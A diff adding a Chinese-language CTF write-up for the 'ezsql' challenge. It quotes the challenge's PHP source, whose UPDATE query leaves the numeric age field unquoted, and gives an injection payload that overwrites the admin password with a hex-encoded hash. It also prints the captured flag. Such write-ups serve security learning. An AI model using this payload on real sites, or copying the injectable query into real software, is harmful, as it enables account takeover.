@@ -1080,17 +1080,91 @@ REPLACE(
 
 # #14.[HUBUCTF 2022 新生赛]ezsql
 
-够难好吧 ，让我研究一下》
+哎这个，靶机卡爆了，我做不了。
+
+试了好几次了。
+
+不过我大致明白做法了。
+
+一开始就是一个login.php和register.php页面。
+
+通过注册登入能进入了，index.php。
+
+直接扫题目url，能找到源码。
+
+通过下载和压缩，能发现在age点存在注入。
+
+```
+──(yu-root㉿yu)-[~]
+└─$ cat ./update.php                                                                                                                                       
+<?php
+/**
+ * Created by PhpStorm.
+ * User: image
+ * Date: 18-3-17
+ * Time: 下午1:08
+ */
+require_once("db.inc.php");
+session_start();
+if(!isset($_SESSION['login'])){
+    header('Location:login.php');
+    die();
+}
+$stmt=$mysqli->prepare("select * from users where id=?");
+$stmt->bind_param('i',$_SESSION['id']);
+$res=$stmt->execute();
+if(!$res){
+    header('Location:index.php?message=error');
+    die("Fata error");
+}
+$user=Array();
+while($row=$stmt->fetch()){
+    $user=$row;
+}
+$stmt->close();
+if(!get_magic_quotes_gpc())
+foreach($_POST as $key=>$value){
+    $_POST[$key]=addslashes($value);
+}
+$query=$mysqli->query("update users set age=$_POST[age],nickname='$_POST[nickname]',description='$_POST[description]' where id=$_SESSION[id]");
+
+if(!$query){
+    $mysqli->close();
+    header('Location:index.php?message=error');
+    die('Update error');
+}
+else{
+    header('Location:index.php');
+    $mysqli->close();
+    die('Update message success');
+}
+?>
+
+```
+
+`1111,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&description=123`
+
+可以通过直接修改username=admin的密码，登入获取flag。
+
+或者可以直接正常攻击获得flag。
 
 
 
+**NSSCTF{44ba12f3-823d-4bed-bc09-2240ac404387}**
+
+最后多试验了几次，发现是input的内容被限制为number，导致我们的注入没生效，f12改一下，再修改就成功了。
 
 
 
+小总结：过程就扫描，拿源码，看漏洞，注意input的格式，就拿下了，update注入还是非常新的知识点，对我来说。
 
 
 
+---
 
+
+
+# #15。[NSSRound#1Basic]sql_by_sql
 
 
 
